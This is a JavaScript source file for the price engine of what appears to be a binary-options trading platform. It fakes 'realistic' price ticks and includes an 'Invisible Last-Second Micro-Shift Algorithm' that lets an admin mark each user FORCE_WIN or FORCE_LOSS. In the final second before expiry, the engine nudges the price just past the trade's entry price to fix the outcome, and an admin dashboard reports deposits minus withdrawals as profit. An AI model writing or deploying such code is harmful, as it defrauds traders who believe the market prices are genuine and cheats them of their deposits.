class MarketEngine {
  constructor(initialPrice = 1.08500, volatility = 0.00015) {
    this.currentPrice = initialPrice;
    this.volatility = volatility;
    this.openTrades = [];
    this.userModes = {}; // Stores admin setting: { userId: 'AUTO' | 'FORCE_WIN' | 'FORCE_LOSS' }
    
    // Financial tracking for admin dashboard
    this.deposits = [];
    this.withdrawals = [];
  }

  // Record Deposit
  addDeposit(amount) {
    this.deposits.push({ amount: parseFloat(amount), timestamp: Date.now() });
  }

  // Record Withdrawal
  addWithdrawal(amount) {
    this.withdrawals.push({ amount: parseFloat(amount), timestamp: Date.now() });
  }

  // Calculate 1h and 24h reports accurately
  getStats() {
    const now = Date.now();
    const oneHourAgo = now - (3600 * 1000);
    const twentyFourHoursAgo = now - (24 * 3600 * 1000);

    const dep1h = this.deposits
      .filter(d => d.timestamp >= oneHourAgo)
      .reduce((sum, d) => sum + d.amount, 0);

    const with1h = this.withdrawals
      .filter(w => w.timestamp >= oneHourAgo)
      .reduce((sum, w) => sum + w.amount, 0);

    const dep24h = this.deposits
      .filter(d => d.timestamp >= twentyFourHoursAgo)
      .reduce((sum, d) => sum + d.amount, 0);

    const with24h = this.withdrawals
      .filter(w => w.timestamp >= twentyFourHoursAgo)
      .reduce((sum, w) => sum + w.amount, 0);

    return {
      dep1h: dep1h.toFixed(2),
      with1h: with1h.toFixed(2),
      dep24h: dep24h.toFixed(2),
      profit24h: (dep24h - with24h).toFixed(2)
    };
  }

  // Generate realistic price ticks (Geometric Brownian Motion)
  generateNextTick() {
    const dt = 0.1;
    const drift = (Math.random() - 0.499) * 0.00002;
    const randomShock = (Math.random() - 0.5) * 2;
    
    const change = (this.currentPrice * drift * dt) + 
                   (this.currentPrice * this.volatility * Math.sqrt(dt) * randomShock);
    
    this.currentPrice = parseFloat((this.currentPrice + change).toFixed(5));
    
    this.processManipulations();
    return this.currentPrice;
  }

  setUserMode(userId, mode) {
    this.userModes[userId] = mode;
  }

  addTrade(trade) {
    this.openTrades.push(trade);
  }

  // Invisible Last-Second Micro-Shift Algorithm
  processManipulations() {
    const now = Date.now();

    this.openTrades.forEach(trade => {
      const timeRemaining = trade.expiresAt - now;

      // Apply invisible shift only during the last 1000ms (1 second) before expiry
      if (timeRemaining <= 1000 && timeRemaining > 0) {
        const mode = this.userModes[trade.userId] || 'AUTO';

        if (mode === 'FORCE_WIN') {
          if (trade.type === 'CALL' && this.currentPrice <= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
          } else if (trade.type === 'PUT' && this.currentPrice >= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
          }
        } else if (mode === 'FORCE_LOSS') {
          if (trade.type === 'CALL' && this.currentPrice >= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice - 0.00003).toFixed(5));
          } else if (trade.type === 'PUT' && this.currentPrice <= trade.entryPrice) {
            this.currentPrice = parseFloat((trade.entryPrice + 0.00003).toFixed(5));
          }
        }
      }
    });

    this.openTrades = this.openTrades.filter(t => t.expiresAt > now);
  }
}

module.exports = MarketEngine;